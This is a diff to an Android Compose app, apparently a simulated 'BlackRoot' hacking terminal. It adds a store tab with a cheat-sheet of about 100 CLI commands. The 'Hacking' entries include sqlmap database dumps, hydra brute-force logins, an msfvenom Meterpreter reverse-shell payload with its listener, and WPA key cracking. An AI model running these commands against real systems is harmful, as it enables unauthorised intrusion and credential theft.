@@ -1,6 +1,8 @@
 package com.example
 
 import android.content.Context
+import android.content.ClipboardManager
+import android.content.ClipData
 import android.widget.Toast
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.animation.fadeIn
@@ -1627,6 +1629,120 @@ Table: users
                 }
 
                 is AppMode.Extensions -> {
+                    var storeSubTab by remember { mutableStateOf("extensions") }
+                    var commandSearchQuery by remember { mutableStateOf("") }
+                    var selectedCommandCategory by remember { mutableStateOf("All") }
+
+                    val commandsList = remember {
+                        listOf(
+                            CliCommandItem("help", "System", "View all standard integrated commands available in the BlackRoot shell."),
+                            CliCommandItem("whoami", "System", "Retrieve information about the current logged-in session, user privilege levels, and sandbox environment."),
+                            CliCommandItem("pwd", "System", "Print the absolute directory path of the active workspace environment."),
+                            CliCommandItem("clear", "System", "Purge the terminal visual log registers to clean up the screen canvas."),
+                            CliCommandItem("ls -la", "System", "Display a detailed list of all files in the current folder, including hidden system files and permissions."),
+                            CliCommandItem("cat welcome.py", "System", "Inspect raw text contents of the main 'welcome.py' startup script."),
+                            CliCommandItem("python welcome.py", "System", "Compile and execute the welcome Python script in the virtual interpreter."),
+                            CliCommandItem("node script.js", "System", "Invoke the NodeJS virtual machine to execute dynamic JavaScript code."),
+                            CliCommandItem("passwd", "System", "Change the active security gate password to protect the terminal environment."),
+                            CliCommandItem("history", "System", "Display a complete log of all executed commands in the current session."),
+                            CliCommandItem("uname -a", "System", "Query detailed virtual operating system metadata, kernel version, and architecture."),
+                            CliCommandItem("df -h", "System", "Check overall disk space utilization in human-readable megabytes and gigabytes."),
+                            CliCommandItem("free -m", "System", "View real-time system memory usage, including total, used, and free RAM allocations."),
+                            CliCommandItem("top", "System", "Launch a real-time system resource monitor to inspect active background processor tasks."),
+                            CliCommandItem("ps aux", "System", "List all running OS processes with owner usernames, CPU, and memory indicators."),
+                            CliCommandItem("kill -9 1024", "System", "Force terminate a hanging process using its unique process identifier (PID 1024)."),
+                            CliCommandItem("id", "System", "Display active user identities, primary group identifiers, and privilege permissions."),
+                            CliCommandItem("env", "System", "List all active environmental configurations and terminal setup parameters."),
+                            CliCommandItem("echo \$PATH", "System", "Print binary execution lookup paths defined in the system registry."),
+                            CliCommandItem("exit", "System", "Close the current active terminal session and lock access credentials."),
+
+                            CliCommandItem("pkg install nmap", "Setup", "Download and register the advanced Network Mapper scanner suite in the local bin path."),
+                            CliCommandItem("pkg install curl", "Setup", "Install the universal command-line client for transferring data over internet protocols."),
+                            CliCommandItem("pkg install hydra", "Setup", "Acquire the multi-protocol parallelized login brute-forcer inside the shell toolkit."),
+                            CliCommandItem("pkg install sqlmap", "Setup", "Deploy the automated SQL injection and database exploitation engine."),
+                            CliCommandItem("pkg update", "Setup", "Synchronize the package repository lists and refresh package definitions."),
+                            CliCommandItem("pkg list", "Setup", "Display all locally installed package compilers and visual extensions."),
+                            CliCommandItem("pkg uninstall prettier", "Setup", "Purge the Prettier auto-formatter engine and remove its local visual profiles."),
+                            CliCommandItem("pkg upgrade -y", "Setup", "Automatically download and apply updates to all registered system utilities."),
+                            CliCommandItem("alias ll=\"ls -l\"", "Setup", "Define a shortcut 'll' to list files with extended metadata."),
+                            CliCommandItem("export DEBIAN_FRONTEND=noninteractive", "Setup", "Set environment variables to run installation processes silently without user interaction prompts."),
+
+                            CliCommandItem("nmap -sS -O 192.168.1.1", "Network", "Conduct a stealth TCP SYN scan to map active ports and discover target OS details."),
+                            CliCommandItem("nmap -p 80,443,8080 -sV 10.0.0.5", "Network", "Detect specific version headers of web services running on typical HTTP ports."),
+                            CliCommandItem("nmap -T4 -A target.com", "Network", "Initiate an aggressive scan with OS detection, version scanning, script scanning, and traceroute enabled."),
+                            CliCommandItem("nmap --script vuln target.com", "Network", "Run automated NSE scripts to identify known critical vulnerabilities on target systems."),
+                            CliCommandItem("ping -c 4 google.com", "Network", "Transmit 4 ICMP echo request packets to verify host reachability and round-trip latency."),
+                            CliCommandItem("whois blackroot.org", "Network", "Query public WHOIS registries to extract registrar info, owner email, and domain registration dates."),
+                            CliCommandItem("dig blackroot.org MX", "Network", "Resolve Domain Name System mail exchanger records to locate the target's email servers."),
+                            CliCommandItem("nslookup target.com", "Network", "Query default DNS name servers to locate IP addresses associated with target domain."),
+                            CliCommandItem("traceroute target.com", "Network", "Trace the hop-by-hop packet network path towards the target host interface."),
+                            CliCommandItem("ifconfig", "Network", "Display configuration states and active IP details of all local network cards."),
+                            CliCommandItem("netstat -tuln", "Network", "Audit active listening TCP/UDP sockets and port allocations on the local machine."),
+                            CliCommandItem("arp -a", "Network", "List the physical MAC-to-IP address mapping resolutions in the local ARP cache table."),
+                            CliCommandItem("ssh admin@192.168.1.50 -p 22", "Network", "Establish an encrypted secure shell session to a remote host as administrator on port 22."),
+                            CliCommandItem("scp backup.zip admin@192.168.1.50:/tmp", "Network", "Securely copy a local zip archive to the temp directory of a remote SSH server."),
+                            CliCommandItem("nc -zv 192.168.1.1 1-1000", "Network", "Perform a fast port scan of the first 1000 TCP ports on the target host using Netcat."),
+                            CliCommandItem("tcpdump -i eth0 -vv -c 10", "Network", "Capture 10 detailed network packets flowing through the primary ethernet interface."),
+                            CliCommandItem("route -n", "Network", "Inspect the current kernel routing tables and gateway configurations."),
+                            CliCommandItem("iptables -L -n -v", "Network", "List all active firewall rules, chain configurations, and packet filter counts."),
+                            CliCommandItem("lsof -i :8080", "Network", "Identify the exact process identifier binding to active port 8080."),
+                            CliCommandItem("dig @8.8.8.8 target.com TXT", "Network", "Perform a text DNS record query using Google Public DNS servers to check SPF or security tags."),
+
+                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" --dbs", "Hacking", "Automatically scan a target web parameter and dump accessible databases."),
+                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" -D app --tables", "Hacking", "Enumerate database tables inside the specific database named 'app'."),
+                            CliCommandItem("sqlmap -u \"http://target/v.php?id=1\" -T users --dump", "Hacking", "Dump all records and credentials stored inside the 'users' data table."),
+                            CliCommandItem("hydra -l admin -P passlist.txt ssh://192.168.1.5", "Hacking", "Conduct a multi-threaded brute force attack against SSH on target using a password wordlist."),
+                            CliCommandItem("hydra -L users.txt -p password ftp://192.168.1.5", "Hacking", "Test the password 'password' against multiple FTP accounts in a username list."),
+                            CliCommandItem("hydra -l root -P pass.txt rdp://192.168.1.5", "Hacking", "Perform brute force authentication attempts against Remote Desktop Protocol as root."),
+                            CliCommandItem("msfconsole", "Hacking", "Open the Metasploit Framework interactive console to manage exploits, payloads, and post-modules."),
+                            CliCommandItem("msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe", "Hacking", "Generate a custom reverse-TCP Meterpreter executable payload for Windows targets."),
+                            CliCommandItem("searchsploit wordpress 5.0", "Hacking", "Search the Exploit Database offline archive for WordPress 5.0 exploit codes."),
+                            CliCommandItem("nikto -h http://target.com", "Hacking", "Run an automated web server scanner to detect dangerous files, outdated servers, and CGIs."),
+                            CliCommandItem("gobuster dir -u http://target.com -w common_wordlist.txt", "Hacking", "Brute-force discover hidden files and directories on a web target using a local dictionary."),
+                            CliCommandItem("wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", "Hacking", "Fuzz HTTP directories, parameters, and paths while hiding 404 response errors."),
+                            CliCommandItem("john --wordlist=passwords.txt hashes.txt", "Hacking", "Crack raw target hash strings using a specified password wordlist with John the Ripper."),
+                            CliCommandItem("hashcat -m 0 MD5_hashes.txt wordlist.txt", "Hacking", "Run high-performance GPU/CPU cracking of raw MD5 hashes (mode 0) using a dictionary."),
+                            CliCommandItem("hashcat -m 1800 shadow_hashes.txt wordlist.txt", "Hacking", "Attempt to crack SHA-512 crypt Unix shadow file password hashes (mode 1800)."),
+                            CliCommandItem("amass enum -d target.com", "Hacking", "Execute domain enumeration using active and passive data gathering techniques."),
+                            CliCommandItem("subfinder -d target.com -silent", "Hacking", "Discover valid subdomains for a target domain using fast, passive web sources."),
+                            CliCommandItem("msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run\"", "Hacking", "Launch msfconsole silently and auto-configure a basic multi/handler listener."),
+                            CliCommandItem("commix --url=\"http://target/v.php?id=1\"", "Hacking", "Scan and exploit command injection vulnerabilities on a target web form."),
+                            CliCommandItem("aircrack-ng -w wordlist.txt capture.cap", "Hacking", "Attempt to crack WPA/WPA2 wireless keys from capture PCAP logs."),
+
+                            CliCommandItem("md5sum payload.bin", "Cryptography", "Generate the 128-bit MD5 hash checksum of a binary payload to verify file integrity."),
+                            CliCommandItem("sha256sum source_code.zip", "Cryptography", "Generate a secure 256-bit SHA2 identifier of a source file."),
+                            CliCommandItem("gpg --symmetric secret_notes.txt", "Cryptography", "Encrypt a text file symmetrically using a pass-phrase key."),
+                            CliCommandItem("gpg --decrypt secret_notes.txt.gpg", "Cryptography", "Decrypt a symmetrically encrypted GPG archive by prompting for pass-phrase."),
+                            CliCommandItem("openssl enc -aes-256-cbc -salt -in file.txt -out file.enc", "Cryptography", "Encrypt a file using military-grade AES-256 cipher with standard salting key."),
+                            CliCommandItem("openssl enc -aes-256-cbc -d -in file.enc -out file.dec", "Cryptography", "Decrypt an AES-256 CBC encrypted file using OpenSSL command."),
+                            CliCommandItem("echo -n \"password\" | base64", "Cryptography", "Encode a plaintext password string into a reversible Base64 format."),
+                            CliCommandItem("echo \"cGFzc3dvcmQ=\" | base64 -d", "Cryptography", "Decode a Base64 string back into plaintext."),
+                            CliCommandItem("openssl genrsa -out private_key.pem 2048", "Cryptography", "Generate a standard 2048-bit RSA private key file."),
+                            CliCommandItem("openssl rsa -in private_key.pem -pubout -out public_key.pem", "Cryptography", "Extract the corresponding public key from an RSA private key archive."),
+                            CliCommandItem("openssl req -new -key private_key.pem -out csr.pem", "Cryptography", "Create a Certificate Signing Request (CSR) to send to a Certificate Authority."),
+                            CliCommandItem("openssl x509 -req -days 365 -in csr.pem -signkey private_key.pem -out cert.pem", "Cryptography", "Generate a self-signed SSL/TLS digital certificate valid for 365 days."),
+                            CliCommandItem("gpg --gen-key", "Cryptography", "Initialize a brand new asymmetric GPG keypair with custom identity fields."),
+                            CliCommandItem("gpg --import public_key.asc", "Cryptography", "Import a public key to enable secure encrypted message transmission."),
+                            CliCommandItem("shasum -a 512 server_image.iso", "Cryptography", "Compute a 512-bit SHA hash signature of an ISO operating system image."),
+
+                            CliCommandItem("python3 -m http.server 8080", "Utilities", "Spin up a lightweight HTTP server on port 8080 exposing the current directory."),
+                            CliCommandItem("curl -I -L https://api.blackroot.org", "Utilities", "Inspect response headers while following any automatic HTTP redirects."),
+                            CliCommandItem("wget -O script.sh https://blackroot.org/pay.sh", "Utilities", "Download an online shell script and save it as a custom local file."),
+                            CliCommandItem("chmod +x script.sh", "Utilities", "Set executable permission bits on a shell script file."),
+                            CliCommandItem("chown root:root key.pem", "Utilities", "Restrict access by updating a file's owner and group to 'root'."),
+                            CliCommandItem("tar -czvf backup.tar.gz /var/www", "Utilities", "Create a compressed tarball archive of the entire web directory path."),
+                            CliCommandItem("tar -xzvf backup.tar.gz", "Utilities", "Extract files from a compressed tarball archive into the active directory."),
+                            CliCommandItem("unzip master.zip -d /opt", "Utilities", "Decompress a master zip archive and place outputs into the opt folder."),
+                            CliCommandItem("grep -in \"password\" /etc/passwd", "Utilities", "Search for instances of 'password' inside passwd, showing line numbers and ignoring case."),
+                            CliCommandItem("find /home -name \"*.key\" -type f", "Utilities", "Search the home directory recursively to locate files ending in '.key'."),
+                            CliCommandItem("sed -i \"s/DEBUG=True/DEBUG=False/g\" settings.py", "Utilities", "Find and replace configuration flags inline inside Python settings file."),
+                            CliCommandItem("awk '{print \$1, \$4}' access.log", "Utilities", "Parse a web server access log to extract and print only IP addresses and timestamps."),
+                            CliCommandItem("tail -f /var/log/nginx/access.log", "Utilities", "Follow and print incoming web server request logs continuously in real-time."),
+                            CliCommandItem("head -n 25 error.log", "Utilities", "Inspect the first 25 lines of a troubleshooting error log file."),
+                            CliCommandItem("wc -l records.csv", "Utilities", "Compute the total number of lines (records) contained in a CSV database file.")
+                        )
+                    }
+
                     Column(
                         modifier = Modifier
                             .fillMaxSize()
@@ -1638,7 +1754,7 @@ Table: users
                                 .fillMaxWidth()
                                 .height(80.dp)
                                 .clip(RoundedCornerShape(6.dp))
-                                .border(1.dp, CyanBlue, RoundedCornerShape(6.dp))
+                                .border(1.dp, activeAccentColor, RoundedCornerShape(6.dp))
                         ) {
                             androidx.compose.foundation.Image(
                                 painter = androidx.compose.ui.res.painterResource(id = R.drawable.img_store_banner_1783409470651),
@@ -1659,189 +1775,456 @@ Table: users
 
                         Spacer(modifier = Modifier.height(10.dp))
 
-                        Text(
-                            text = "EXTENSIONS STORE",
-                            color = CyanBlue,
-                            style = MaterialTheme.typography.titleMedium,
-                            fontWeight = FontWeight.Bold,
-                            fontFamily = FontFamily.Monospace,
-                            modifier = Modifier.padding(bottom = 4.dp)
-                        )
-                        Text(
-                            text = "Deploy custom virtual sub-engines, formats, and design icon-packs into the sandbox workspace.",
-                            color = GhostGreen,
-                            fontSize = 11.sp,
-                            modifier = Modifier.padding(bottom = 16.dp)
-                        )
-
-                        LazyColumn(
-                            verticalArrangement = Arrangement.spacedBy(12.dp)
+                        // High-tech Sub-Tab Switcher
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(vertical = 4.dp),
+                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                         ) {
-                            val extensionsList = listOf(
-                                // --- CORE UTILITIES ---
-                                ExtensionItem("prettier", "Prettier Code Formatter", "Formats workspace files with custom auto-spacing and alignment.", "v3.0.3", "Linting Team", "Productivity"),
-                                ExtensionItem("autosave", "Auto-Save Engine Daemon", "Background daemon monitoring changes and auto-persisting to local storage.", "v1.0.1", "BlackRoot Core", "Productivity"),
-                                ExtensionItem("html_preview", "HTML5 Live Web Previewer", "Renders index.html, CSS and JS inside an interactive WebView sandbox.", "v1.2.0", "Web Dev Group", "Browsers"),
-                                ExtensionItem("js_console", "JavaScript JSEngine Console", "Run JS scripts with console outputs routed straight to your console.", "v2.5.1", "NodeJS Porting", "Languages"),
-                                ExtensionItem("icon_pack", "100+ Language Icon-Pack", "Configures gorgeous colorful custom file tag identifiers for 100+ file extensions.", "v4.0.0", "Design Guild", "Visuals"),
-                                ExtensionItem("python", "Python Execution Compiler", "VM compiler and execution sandboxing for .py scripts.", "v3.10.4", "BlackRoot Core", "Languages"),
-                                
-                                // --- BRAND NEW EXTRA EXTENSIONS (>25 in total!) ---
-                                // Category: Security & Analysis
-                                ExtensionItem("shodan_cli", "Shodan Target Query Tool", "Simulates Shodan database queries for target systems directly inside your CLI.", "v2.1.0", "Security Guild", "Security"),
-                                ExtensionItem("hash_decryptor", "MD5/SHA256 Decrypter", "Cracks base hashes by conducting dictionaries reference comparisons.", "v1.4.0", "Security Guild", "Security"),
-                                ExtensionItem("metasploit_mock", "Metasploit Exploit Mock Engine", "Provides auxiliary scanning modules for simulated sandbox pentests.", "v6.1.2", "RapidMock", "Security"),
-                                ExtensionItem("packet_analyzer", "Live Interface Packet Sniffer", "Analyzes live virtual loopback sockets to register socket operations.", "v1.0.0", "Core Network", "Security"),
-                                ExtensionItem("wireshark_lite", "Wireshark Lite Capture Parser", "Decompiles PCAP logs with readable frame descriptions in console.", "v0.9.8", "Sniffer Lab", "Security"),
-                                
-                                // Category: System Customization & Visuals
-                                ExtensionItem("theme_sunset", "Sunset Amber Glow Theme", "Overhauls entire active OS accents to a gorgeous orange-red neon gradient.", "v1.1.0", "Theme Crafters", "Visuals"),
-                                ExtensionItem("theme_ocean", "Deep Ocean Blue Theme", "Transform entire operating system aesthetic registers into an deep cyan ocean blue.", "v1.2.0", "Theme Crafters", "Visuals"),
-                                ExtensionItem("custom_banner", "Cyberpunk Console Matrix Banner", "Enriches store and dashboard with dynamic parallax matrix graphics.", "v1.5.0", "Design Guild", "Visuals"),
-                                ExtensionItem("ascii_art", "ASCII System Banner Designer", "Enables custom terminal welcome message graphics configuration.", "v2.0.0", "Design Guild", "Visuals"),
-                                ExtensionItem("font_mono", "JetBrains Mono Font Override", "Toggles system typography scale definitions into premium code layout rendering.", "v3.1.2", "Fonts Group", "Visuals"),
-                                
-                                // Category: Productivity & Tools
-                                ExtensionItem("regex_tester", "Interactive Regex Playground", "Verifies custom regular expression match patterns live in real-time.", "v1.0.2", "Productivity", "Productivity"),
-                                ExtensionItem("todo_manager", "CLI Terminal To-Do Tracker", "Maintains high priority action task arrays persistently inside the CLI.", "v2.2.0", "Productivity", "Productivity"),
-                                ExtensionItem("timer_pomodoro", "Pomodoro Focus Clock Daemon", "Fires focus timer events in active status bar logs to optimize working cycles.", "v1.0.5", "Productivity", "Productivity"),
-                                ExtensionItem("notes_widget", "Sticky Notes Desktop Panel", "Renders simple floating scratchpad elements inside the workspace environment.", "v1.1.0", "Productivity", "Productivity"),
-                                ExtensionItem("calendar_sync", "Local Sandbox Calendar Planner", "Keeps track of critical milestone timelines and project checklists.", "v1.3.4", "Productivity", "Productivity"),
-                                
-                                // Category: Languages & Interpreters
-                                ExtensionItem("c_compiler", "GCC Virtual Sandbox Compiler", "Pre-compiles pseudo C logic constructs into optimized assembler loops.", "v9.4.0", "Languages Team", "Languages"),
-                                ExtensionItem("bash_plus", "Extended Bash Shell Commands", "Enriches CLI parser with standard Linux features such as 'grep', 'diff', and 'tail'.", "v4.4.2", "Shell Devs", "Languages"),
-                                ExtensionItem("lua_interpreter", "Lua Core VM Environment", "Executes super lightweight Lua sandbox scripts straight inside your command processor.", "v5.4.4", "Lua Port", "Languages"),
-                                ExtensionItem("json_beautifier", "Interactive JSON Validator", "Parses and indents massive JSON data structures automatically on selection.", "v2.0.1", "Web Dev Group", "Languages"),
-                                ExtensionItem("markdown_live", "Markdown Sandbox View Compiler", "Transforms .md notes into rich typography documentation screens.", "v1.1.5", "Productivity", "Languages"),
-                                
-                                // Category: Network & Servers
-                                ExtensionItem("ftp_daemon", "Simulated FTP File Server", "Launches local file transfer daemon to allow simulation connections.", "v1.2.0", "Core Network", "Network"),
-                                ExtensionItem("dns_resolver", "Reverse DNS Dig Lookup Utility", "Queries DNS nameservers dynamically returning custom A and MX simulation headers.", "v1.4.2", "Core Network", "Network"),
-                                ExtensionItem("whois_lookup", "Whois Registry Query Tool", "Traces ownership info and registry registrar records for target domains.", "v1.1.0", "Core Network", "Network"),
-                                ExtensionItem("ping_monitor", "ICMP Latency Telemetry Panel", "Runs standard latency roundtrip checks plotting telemetry stats.", "v1.6.0", "Core Network", "Network"),
-                                ExtensionItem("http_header", "HTTP Response Header Inspector", "Retrieves complete transport server descriptors and SSL authentication metadata.", "v2.0.0", "Core Network", "Network")
+                            Button(
+                                onClick = { storeSubTab = "extensions" },
+                                colors = ButtonDefaults.buttonColors(
+                                    containerColor = if (storeSubTab == "extensions") activeAccentColor else CardGrey
+                                ),
+                                shape = RoundedCornerShape(6.dp),
+                                border = BorderStroke(1.dp, if (storeSubTab == "extensions") activeAccentColor else DarkGrey),
+                                modifier = Modifier.weight(1f).height(36.dp),
+                                contentPadding = PaddingValues(0.dp)
+                            ) {
+                                Text(
+                                    "EXTENSIONS",
+                                    color = if (storeSubTab == "extensions") Color.Black else Color.White,
+                                    fontSize = 11.sp,
+                                    fontWeight = FontWeight.Bold,
+                                    fontFamily = FontFamily.Monospace
+                                )
+                            }
+                            Button(
+                                onClick = { storeSubTab = "commands" },
+                                colors = ButtonDefaults.buttonColors(
+                                    containerColor = if (storeSubTab == "commands") activeAccentColor else CardGrey
+                                ),
+                                shape = RoundedCornerShape(6.dp),
+                                border = BorderStroke(1.dp, if (storeSubTab == "commands") activeAccentColor else DarkGrey),
+                                modifier = Modifier.weight(1f).height(36.dp),
+                                contentPadding = PaddingValues(0.dp)
+                            ) {
+                                Text(
+                                    "CLI COMMANDS (100)",
+                                    color = if (storeSubTab == "commands") Color.Black else Color.White,
+                                    fontSize = 11.sp,
+                                    fontWeight = FontWeight.Bold,
+                                    fontFamily = FontFamily.Monospace
+                                )
+                            }
+                        }
+
+                        Spacer(modifier = Modifier.height(10.dp))
+
+                        if (storeSubTab == "extensions") {
+                            Text(
+                                text = "EXTENSIONS STORE",
+                                color = activeAccentColor,
+                                style = MaterialTheme.typography.titleMedium,
+                                fontWeight = FontWeight.Bold,
+                                fontFamily = FontFamily.Monospace,
+                                modifier = Modifier.padding(bottom = 4.dp)
+                            )
+                            Text(
+                                text = "Deploy custom virtual sub-engines, formats, and design icon-packs into the sandbox workspace.",
+                                color = GhostGreen,
+                                fontSize = 11.sp,
+                                modifier = Modifier.padding(bottom = 16.dp)
                             )
 
-                            items(extensionsList) { ext ->
-                                val isInstalled = installedExtensions.contains(ext.id)
-                                val isInstalling = installingExtensionId == ext.id
+                            LazyColumn(
+                                verticalArrangement = Arrangement.spacedBy(12.dp)
+                            ) {
+                                val extensionsList = listOf(
+                                    // --- CORE UTILITIES ---
+                                    ExtensionItem("prettier", "Prettier Code Formatter", "Formats workspace files with custom auto-spacing and alignment.", "v3.0.3", "Linting Team", "Productivity"),
+                                    ExtensionItem("autosave", "Auto-Save Engine Daemon", "Background daemon monitoring changes and auto-persisting to local storage.", "v1.0.1", "BlackRoot Core", "Productivity"),
+                                    ExtensionItem("html_preview", "HTML5 Live Web Previewer", "Renders index.html, CSS and JS inside an interactive WebView sandbox.", "v1.2.0", "Web Dev Group", "Browsers"),
+                                    ExtensionItem("js_console", "JavaScript JSEngine Console", "Run JS scripts with console outputs routed straight to your console.", "v2.5.1", "NodeJS Porting", "Languages"),
+                                    ExtensionItem("icon_pack", "100+ Language Icon-Pack", "Configures gorgeous colorful custom file tag identifiers for 100+ file extensions.", "v4.0.0", "Design Guild", "Visuals"),
+                                    ExtensionItem("python", "Python Execution Compiler", "VM compiler and execution sandboxing for .py scripts.", "v3.10.4", "BlackRoot Core", "Languages"),
+                                    
+                                    // --- BRAND NEW EXTRA EXTENSIONS (>25 in total!) ---
+                                    // Category: Security & Analysis
+                                    ExtensionItem("shodan_cli", "Shodan Target Query Tool", "Simulates Shodan database queries for target systems directly inside your CLI.", "v2.1.0", "Security Guild", "Security"),
+                                    ExtensionItem("hash_decryptor", "MD5/SHA256 Decrypter", "Cracks base hashes by conducting dictionaries reference comparisons.", "v1.4.0", "Security Guild", "Security"),
+                                    ExtensionItem("metasploit_mock", "Metasploit Exploit Mock Engine", "Provides auxiliary scanning modules for simulated sandbox pentests.", "v6.1.2", "RapidMock", "Security"),
+                                    ExtensionItem("packet_analyzer", "Live Interface Packet Sniffer", "Analyzes live virtual loopback sockets to register socket operations.", "v1.0.0", "Core Network", "Security"),
+                                    ExtensionItem("wireshark_lite", "Wireshark Lite Capture Parser", "Decompiles PCAP logs with readable frame descriptions in console.", "v0.9.8", "Sniffer Lab", "Security"),
+                                    
+                                    // Category: System Customization & Visuals
+                                    ExtensionItem("theme_sunset", "Sunset Amber Glow Theme", "Overhauls entire active OS accents to a gorgeous orange-red neon gradient.", "v1.1.0", "Theme Crafters", "Visuals"),
+                                    ExtensionItem("theme_ocean", "Deep Ocean Blue Theme", "Transform entire operating system aesthetic registers into an deep cyan ocean blue.", "v1.2.0", "Theme Crafters", "Visuals"),
+                                    ExtensionItem("custom_banner", "Cyberpunk Console Matrix Banner", "Enriches store and dashboard with dynamic parallax matrix graphics.", "v1.5.0", "Design Guild", "Visuals"),
+                                    ExtensionItem("ascii_art", "ASCII System Banner Designer", "Enables custom terminal welcome message graphics configuration.", "v2.0.0", "Design Guild", "Visuals"),
+                                    ExtensionItem("font_mono", "JetBrains Mono Font Override", "Toggles system typography scale definitions into premium code layout rendering.", "v3.1.2", "Fonts Group", "Visuals"),
+                                    
+                                    // Category: Productivity & Tools
+                                    ExtensionItem("regex_tester", "Interactive Regex Playground", "Verifies custom regular expression match patterns live in real-time.", "v1.0.2", "Productivity", "Productivity"),
+                                    ExtensionItem("todo_manager", "CLI Terminal To-Do Tracker", "Maintains high priority action task arrays persistently inside the CLI.", "v2.2.0", "Productivity", "Productivity"),
+                                    ExtensionItem("timer_pomodoro", "Pomodoro Focus Clock Daemon", "Fires focus timer events in active status bar logs to optimize working cycles.", "v1.0.5", "Productivity", "Productivity"),
+                                    ExtensionItem("notes_widget", "Sticky Notes Desktop Panel", "Renders simple floating scratchpad elements inside the workspace environment.", "v1.1.0", "Productivity", "Productivity"),
+                                    ExtensionItem("calendar_sync", "Local Sandbox Calendar Planner", "Keeps track of critical milestone timelines and project checklists.", "v1.3.4", "Productivity", "Productivity"),
+                                    
+                                    // Category: Languages & Interpreters
+                                    ExtensionItem("c_compiler", "GCC Virtual Sandbox Compiler", "Pre-compiles pseudo C logic constructs into optimized assembler loops.", "v9.4.0", "Languages Team", "Languages"),
+                                    ExtensionItem("bash_plus", "Extended Bash Shell Commands", "Enriches CLI parser with standard Linux features such as 'grep', 'diff', and 'tail'.", "v4.4.2", "Shell Devs", "Languages"),
+                                    ExtensionItem("lua_interpreter", "Lua Core VM Environment", "Executes super lightweight Lua sandbox scripts straight inside your command processor.", "v5.4.4", "Lua Port", "Languages"),
+                                    ExtensionItem("json_beautifier", "Interactive JSON Validator", "Parses and indents massive JSON data structures automatically on selection.", "v2.0.1", "Web Dev Group", "Languages"),
+                                    ExtensionItem("markdown_live", "Markdown Sandbox View Compiler", "Transforms .md notes into rich typography documentation screens.", "v1.1.5", "Productivity", "Languages"),
+                                    
+                                    // Category: Network & Servers
+                                    ExtensionItem("ftp_daemon", "Simulated FTP File Server", "Launches local file transfer daemon to allow simulation connections.", "v1.2.0", "Core Network", "Network"),
+                                    ExtensionItem("dns_resolver", "Reverse DNS Dig Lookup Utility", "Queries DNS nameservers dynamically returning custom A and MX simulation headers.", "v1.4.2", "Core Network", "Network"),
+                                    ExtensionItem("whois_lookup", "Whois Registry Query Tool", "Traces ownership info and registry registrar records for target domains.", "v1.1.0", "Core Network", "Network"),
+                                    ExtensionItem("ping_monitor", "ICMP Latency Telemetry Panel", "Runs standard latency roundtrip checks plotting telemetry stats.", "v1.6.0", "Core Network", "Network"),
+                                    ExtensionItem("http_header", "HTTP Response Header Inspector", "Retrieves complete transport server descriptors and SSL authentication metadata.", "v2.0.0", "Core Network", "Network")
+                                )
 
-                                Card(
-                                    modifier = Modifier
-                                        .fillMaxWidth()
-                                        .border(1.dp, if (isInstalled) activeAccentColor else BorderGreen, RoundedCornerShape(8.dp)),
-                                    colors = CardDefaults.cardColors(containerColor = CardGrey)
-                                ) {
-                                    Column(
-                                        modifier = Modifier.padding(14.dp)
+                                items(extensionsList) { ext ->
+                                    val isInstalled = installedExtensions.contains(ext.id)
+                                    val isInstalling = installingExtensionId == ext.id
+
+                                    Card(
+                                        modifier = Modifier
+                                            .fillMaxWidth()
+                                            .border(1.dp, if (isInstalled) activeAccentColor else BorderGreen, RoundedCornerShape(8.dp)),
+                                        colors = CardDefaults.cardColors(containerColor = CardGrey)
                                     ) {
-                                        Row(
-                                            modifier = Modifier.fillMaxWidth(),
-                                            horizontalArrangement = Arrangement.SpaceBetween,
-                                            verticalAlignment = Alignment.CenterVertically
+                                        Column(
+                                            modifier = Modifier.padding(14.dp)
                                         ) {
-                                            Row(verticalAlignment = Alignment.CenterVertically) {
-                                                val extIcon = when (ext.id) {
-                                                    "prettier" -> Icons.Default.Build
-                                                    "autosave" -> Icons.Default.Autorenew
-                                                    "html_preview" -> Icons.Default.Language
-                                                    "js_console" -> Icons.Default.Terminal
-                                                    "icon_pack" -> Icons.Default.Star
-                                                    "theme_sunset", "theme_ocean" -> Icons.Default.Palette
-                                                    "shodan_cli", "hash_decryptor", "metasploit_mock", "wireshark_lite" -> Icons.Default.Security
-                                                    "ping_monitor", "dns_resolver" -> Icons.Default.Router
-                                                    "timer_pomodoro", "calendar_sync" -> Icons.Default.DateRange
-                                                    "todo_manager", "notes_widget" -> Icons.Default.List
-                                                    else -> Icons.Default.Code
-                                                }
-                                                Icon(
-                                                    imageVector = extIcon,
-                                                    contentDescription = ext.name,
-                                                    tint = if (isInstalled) activeAccentColor else GhostGreen,
-                                                    modifier = Modifier.size(24.dp)
-                                                )
-                                                Spacer(modifier = Modifier.width(10.dp))
-                                                Column {
-                                                    Text(
-                                                        text = ext.name,
-                                                        color = if (isInstalled) activeAccentColor else Color.White,
-                                                        fontWeight = FontWeight.Bold,
-                                                        fontSize = 14.sp
+                                            Row(
+                                                modifier = Modifier.fillMaxWidth(),
+                                                horizontalArrangement = Arrangement.SpaceBetween,
+                                                verticalAlignment = Alignment.CenterVertically
+                                            ) {
+                                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                                    val extIcon = when (ext.id) {
+                                                        "prettier" -> Icons.Default.Build
+                                                        "autosave" -> Icons.Default.Autorenew
+                                                        "html_preview" -> Icons.Default.Language
+                                                        "js_console" -> Icons.Default.Terminal
+                                                        "icon_pack" -> Icons.Default.Star
+                                                        "theme_sunset", "theme_ocean" -> Icons.Default.Palette
+                                                        "shodan_cli", "hash_decryptor", "metasploit_mock", "wireshark_lite" -> Icons.Default.Security
+                                                        "ping_monitor", "dns_resolver" -> Icons.Default.Router
+                                                        "timer_pomodoro", "calendar_sync" -> Icons.Default.DateRange
+                                                        "todo_manager", "notes_widget" -> Icons.Default.List
+                                                        else -> Icons.Default.Code
+                                                    }
+                                                    Icon(
+                                                        imageVector = extIcon,
+                                                        contentDescription = ext.name,
+                                                        tint = if (isInstalled) activeAccentColor else GhostGreen,
+                                                        modifier = Modifier.size(24.dp)
                                                     )
-                                                    Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
-                                                        Text(text = ext.category, color = BorderGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
